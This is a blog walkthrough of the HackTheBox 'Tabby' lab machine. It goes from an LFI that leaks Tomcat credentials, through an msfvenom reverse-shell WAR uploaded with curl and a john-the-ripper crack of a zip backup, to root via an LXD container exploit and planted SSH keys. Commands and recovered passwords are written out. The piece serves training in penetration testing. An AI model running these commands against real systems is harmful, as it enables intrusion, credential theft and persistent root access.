---
layout: post
title: HackTheBox Tabby walkthrough
gh-repo: c00rni/c00rni.github.io
gh-badge: [star, fork, follow]
tags: [enumeration, hackthebox, ssh, lxd, tomcat, lfi, johntheripper]
comments: true
---


This is a write up about Tabby box from HackThebox. The machine ip address is 10.10.10.194 and is rated as easy by the community. In short, I exploited a Local File Inclusion (LFI) vulnerability to get the admin web server credentials. I then used those credentials to upload a file on the server and get remote code execution. I brute force a protected file and found the password of an user. The user I had compromise was member of the lxd group wich allowed me to elevate my privileges to root.


![into_card.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/8ef266cc2812400c8683218347a1d3fc.png)

# Enumeration

As always I started by port enumeration.


![full_scan.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/987987c4fcf945e7aa64b25d8536798e.png)




![detail_scan.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/1f617483764c4fbba3a9f9b7a24f0afd.png)



## Port 80
I browser to the main website and found a [LFI](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion).



![suspicious_url.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/d980c4ba589345328af65147252aa056.png)



![lfi.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/27fc66fd9f9447228f593b962893566b.png)

## Port 8080
The seconde HTTP server had a basic installation of Tomcat 9. I did my homework and found Tomcat versions 7 to 9 were vulnerable to remote code execution if I could upload a malicious WAR file into the server.

Tomcat 9 allows users to upload WAR files into the server to  install web applications (see: [remote deploy documentation](http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Deploy_A_New_Application_Archive_(WAR)_Remotely)) but users must be authenticated and have manager rights.
I used the LFI discovered previously to get access to `tomcat-users.xml` configuration file to get users credentials and rights.

![tomcat-users.xml.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/e2780244817345728fc064069c33ee3a.png)

# Foothold
Tomcat is an open-source implementation of the Java servlet technology and can run jsp files. I used `msfvenom` to create a WAR file containing a malicious jsp document and upload the war file with curl.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOUR-IP-ADDR -f war -o reverseshell.war
curl -v -u 'tomcat':'$3cureP4s5w0rd123!' -T reverseshell.war http://10.10.10.194:8080/manager/text/deploy?path=/reverseshell4444&update=true
```

I used netcat to listen on port 4444 and browser to my newly upload application (http://10.10.10.194:8080/reverseshell4444) to get a shell.


![tomcat_shell.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/e92487ac5644472cb38809675ee6b619.png)

# Normal user privilege escalation
I found a backup file protected by a password own by ash. 



![found_backup_file.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/c0fbaabf39734fd8aa4c5d8ae1039119.png)



Any user could read the file so I uploaded it on my machine and brute force the password with [john The Ripper](https://www.openwall.com/john/).

```bash
/usr/sbin/zip2john 16162020_backup.zip  > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

![backup_password.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/36d527c32c9c49d1882a6f9d650e8003.png)

I used the command `su ash` and log in with the password `admin@it`.

![ash_shell.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/680afd5896ff4d52b1efe8d6e1cf2c93.png)

# Root Privilege escalation
LXD is Ubuntu’s container manager utilising linux containers. It could be considered to act in the same sphere as docker. LXD group should by no means contain normal users because there is multiple trivial ways to escalate privileges to root.

For the [lxd exploit](https://www.exploit-db.com/exploits/46978) to work properly I needed to upload a container image into the box since Tabby wasn't connected to the internet.

```bash
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
chmod +x build-alpine
./build-alpine
searchsploit -m linux/local/46978.sh
```

I downloaded '46978.sh' script and the container image from my machine into ash root directory and got a root shell on the container.

```
chmod +x 46978.sh
./46978.sh -f CONATAINER_IMAGE
```

![root_container.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/014af8c4a7fd4c54a6b4895471d07390.png)

The file system of Tabby is accessible from `/mnt/root/` and I could make any modification on the box since were root on the container. I created a pair of SSH key with `ssh-keygen` command and copy to content of the public key into `/mnt/root/.ssh/authorized_keys` file. 

I SSH into the box as root with the priviate key and got a shell.


![root_shell.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/5015ddcdcd06472190bc2e70b88565c9.png)

I like realistic box and this box is definitely one of them. I learned a lot about tomcat and lxd privilege root escalation.

# References
- [Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [lxd privilege escalation exploit](https://www.exploit-db.com/exploits/46978)
- [Automated Enumaration linux tool](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
- [Tomcat 9 remote deploy documentation](http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Deploy_A_New_Application_Archive_(WAR)_Remotely)
- [John the ripper](https://www.openwall.com/john/)
